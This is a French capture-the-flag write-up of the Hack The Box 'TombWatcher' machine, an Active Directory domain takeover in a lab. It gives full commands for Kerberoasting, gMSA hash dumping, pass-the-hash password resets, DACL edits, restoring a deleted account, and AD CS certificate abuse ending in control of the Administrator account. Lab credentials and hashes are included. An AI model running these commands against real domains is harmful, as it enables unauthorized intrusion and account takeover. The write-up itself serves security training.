![[TombWatcher.png]]

- Enumération complète des services 
- Exploitation Kerberoasting 
- Escalade de privilèges via ajout à des groupes avec délégation.
- Abus d’un compte de service géré de groupe (gMSA)
## Enumeration 
## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 00:41:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
|_ssl-date: 2025-06-10T00:42:42+00:00; +3h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T00:42:42+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T00:42:42+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
|_ssl-date: 2025-06-10T00:42:42+00:00; +3h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
```

Plusieurs ports ouverts sur le contrôleur de domaine, notamment des services Windows AD classiques : DNS (53) , HTTP (80) — Microsoft IIS 10.0 , Kerberos (88) , RPC (135, 49666, etc.) , SMB / NetBIOS (139, 445) , LDAP (389), LDAPS (636), LDAP sur port 3268, 3269 , Divers autres services Microsoft (mc-nmf, HTTPAPI, etc.)
Les certificats SSL sur LDAP montrent que le DC est nommé **DC01.tombwatcher.htb**, avec une autorité interne tombwatcher-CA-1.
## Website 
Le serveur HTTP (IIS 10.0) est accessible, mais le scan montre un titre IIS basique.

![[Pasted image 20250609225435.png]]

## Enumeration users
**henry / H3nry_987TGV!**

![[Pasted image 20250609225625.png]]
 **users :**
 john ,sam ,Alfred ,Henry ,krbtgt ,Guest ,Administrator 
 
![[Pasted image 20250609232553.png]]

![[Pasted image 20250609235134.png]]

extraire les tickets Kerberos de comptes avec SPN enregistrés.

```bash
python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
```

![[Pasted image 20250610040240.png]]
le mot de passe de l’utilisateur Alfred est récupéré
**Alfred:basketball**

> **Note :** 
>L'utilisateur ALFRED@TOMBWATCHER.HTB peut s'ajouter au groupe INFRASTRUCTURE@TOMBWATCHER.HTB. Grâce à la délégation de groupe de sécurité, les membres d'un groupe de sécurité disposent des mêmes privilèges que ce groupe.
>En s'ajoutant au groupe, ALFRED@TOMBWATCHER.HTB obtiendra les mêmes privilèges que INFRASTRUCTURE@TOMBWATCHER.HTB.

Alfred peut s’ajouter lui-même au groupe **INFRASTRUCTURE**, ce qui est un vecteur d’escalade via délégation de groupe.

```bash
bloodyAD -d tombwatcher.htb -u alfred -p basketball --host 10.10.11.72 add groupMember 'CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb' 'CN=Alfred,CN=Users,DC=tombwatcher,DC=htb'
```

Cette action donne à Alfred les mêmes privilèges que le groupe INFRASTRUCTURE.

![[Pasted image 20250612095145.png]]


>**Note**: 
ANSIBLE_DEV$@TOMBWATCHER.HTB est un compte de service géré de groupe. Le groupe INFRASTRUCTURE@TOMBWATCHER.HTB peut récupérer le mot de passe du GMSA ANSIBLE_DEV$@TOMBWATCHER.HTB.
Les comptes de service gérés de groupe sont un type particulier d'objet Active Directory, où le mot de passe est géré et modifié automatiquement par les contrôleurs de domaine à intervalles réguliers (vérifiez l'attribut MSDS-ManagedPasswordInterval).
L'objectif d'un GMSA est de permettre à certains comptes d'ordinateur de récupérer le mot de passe du GMSA, puis d'exécuter des services locaux en tant que GMSA. Un attaquant disposant du contrôle d'un principal autorisé peut abuser de ce privilège pour se faire passer pour le GMSA.

Extraction des secrets du gMSA :

```bash
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
```

![[Pasted image 20250610043513.png]]

**ansible_dev$:Infrastructure**
**ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc**
**ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3**
**ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a**

>**Note :**
>L'utilisateur ANSIBLE_DEV$@TOMBWATCHER.HTB a la capacité de modifier le mot de passe de l'utilisateur SAM@TOMBWATCHER.HTB sans connaître le mot de passe actuel de cet utilisateur.

Avec le hash récupéré, modification du mot de passe de l’utilisateur SAM (compte sensible) :

```bash
pth-net rpc password "sam" 'NewP@ssword1234!' -U "tombwatcher"/"ansible_dev$"%"91366223f82cd8d39b0e767f0061fd9a":"1c37d00093dc2a5f25176bf2d474afdc" -S "10.10.11.72"
```

Ensuite, avec **impacket-owneredit** et **impacket-dacledit**, modification des droits de SAM pour contrôler JOHN.


```bash
impacket-owneredit tombwatcher/sam:NewP@ssword1234! -dc-ip 10.10.11.72 -action write -new-owner sam -target john
```

![[Pasted image 20250610044537.png]]

```bash
impacket-dacledit tombwatcher/sam:NewP@ssword1234! -dc-ip 10.10.11.72 -action write -rights 'FullControl' -principal 'sam' -target 'john'
```

![[Pasted image 20250610045545.png]]

-Modification du mot de passe de JOHN via **bloodyAD** :

```bash
python3 bloodyAD.py -u 'sam' -p 'NewP@ssword1234!' -d tombwatcher.htb --dc-ip 10.10.11.72 set password john 'NewPassword123!
```

![[Pasted image 20250610045858.png]]

```bash
evil-winrm -i 10.10.11.72 -u john -p'NewPassword123!'
```

![[Pasted image 20250610050119.png]]

# ROOT
Escalade de privilege sur la gestion des certificats

Avec JOHN, modification des permissions ACL sur l’OU `ADCS`

```bash
impacket-dacledit -action write -rights FullControl -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' tombwatcher.htb/john:'NewPassword123!' -dc-ip 10.10.11.72
```

Liste des comptes utilisateurs supprimés dans l’OU `ADCS`

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid,lastKnownParent,ObjectGUID | Select-Object Name,ObjectGUID,objectSid,lastKnownParent | Format-List
```


```
Name            : cert_admin
                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
```

Plusieurs comptes **cert_admin** supprimés sont trouvés.
- Restauration du compte supprimé `cert_admin` :

```powershell
Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
```

Réinitialisation et activation du compte

```powershell
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rd123" -Force)
```

```powershell
Enable-ADAccount -Identity cert_admin
```

![[Pasted image 20250610053438.png]]

Recherche de vulnérabilités associées à `cert_admin`

```bash
certipy-ad find -u 'cert_admin' -p 'NewP@ssw0rd123' -dc-ip 10.10.11.72 -vulnerable -stdout
```

![[Pasted image 20250612112957.png]]

Utilisation du compte cert_admin pour demander un certificat TLS

```bash
certipy-ad req -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 -u cert_admin@tombwatcher.htb -p'NewP@ssw0rd123' -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

![[Pasted image 20250612113325.png]]

Extraction du certificat et authentification avec celui-ci via **certipy**
Passage du mot de passe Administrateur :

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
change_password Administrator NewP@ssw0rd123
```

![[Pasted image 20250612113406.png]]

Prise de contrôle complète du compte Administrateur (privilèges élevés).

![[Pasted image 20250612114014.png]]

[^1]: 
